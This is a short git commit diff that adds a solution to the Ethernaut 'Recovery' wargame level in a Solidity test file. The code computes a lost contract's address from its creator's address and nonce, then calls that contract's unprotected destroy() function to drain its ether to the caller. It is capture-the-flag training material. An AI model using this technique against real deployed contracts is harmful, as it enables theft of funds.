0cc2586907f3a4c50391b56ede024d5e4be14893
Ashish Binu <ashishbinu90@gmail.com>
2023-07-08 17:54:19 +0530

    feat: Recovery hack

--- src/test/Recovery.t.sol
+++ src/test/Recovery.t.sol
@@ -5,6 +5,10 @@ import "../Recovery/RecoveryFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
+interface ISimpleToken {
+    function destroy(address payable _to) external;
+}
+
 contract RecoveryTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
@@ -31,7 +35,10 @@ contract RecoveryTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed#:~:text=The%20address%20for%20an%20Ethereum,then%20hashed%20with%20Keccak%2D256.
+        address simpleTokenAddress  = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), ethernautRecovery, bytes1(0x01))))));
 
+        ISimpleToken(simpleTokenAddress).destroy(payable(msg.sender));
 
         //////////////////////
         // LEVEL SUBMISSION //
